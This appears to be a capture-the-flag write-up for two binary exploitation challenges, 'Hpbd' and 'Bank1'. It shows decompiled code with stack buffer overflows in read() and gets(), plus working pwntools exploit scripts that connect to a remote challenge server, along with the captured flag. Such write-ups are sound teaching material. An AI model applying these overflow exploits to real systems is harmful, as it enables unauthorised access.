# **Hpbd**

Open IDA and we have the pseudo code:

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [esp+0h] [ebp-24h] BYREF
  int v5; // [esp+18h] [ebp-Ch]
  int *v6; // [esp+1Ch] [ebp-8h]

  v6 = &argc;
  v5 = 0xFEEFEFFE;
  setup();
  puts("Tell me your birthday?");
  read(0, buf, 0x1Eu);
  if ( v5 == 0xCABBFEFF )
    run_cmd("/bin/bash");
  else
    run_cmd("/bin/date");
  return 0;
}
```

This is a basic buffer overflow vulnerability of `read` function and change the variable v5 to 0xCABBFEFF.  

Let's start coding:

```python
from pwn import *

r = remote("61.28.237.24",30200)

r.recvuntil('Tell me your birthday?')
payload= "A"*24+p32(0xCABBFEFF) # 24 letter A to fill buf[] + the little endian shellcode to overwrite v5
r.send(payload)
r.interactive()
```

### **Bank1**
Pseudo code from IDA:

```c++
void getFlag()
{
  system("cat flag.txt");
}
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
  if ( balance )
    getFlag();
}
```

This is even easier than HPBD since we just need to overwrite "balance". Exploit the vulnerable gets function with buffer overflow and we can get to the flag:

```python
from pwn import *

r = remote("61.28.237.24", 30202)

r.recvuntil('[+] Please enter your name: ')
payload= "A"*64+p32(0xCABBFEFF) #64 "A" to fill name[64] and I copied this from hpbd since I was lazy xD(random characters is good enough )
r.send(payload)
r.interactive()
#HCMUS-CTF{that_was_easy_xd}
```

[**Turn Back**](README.md)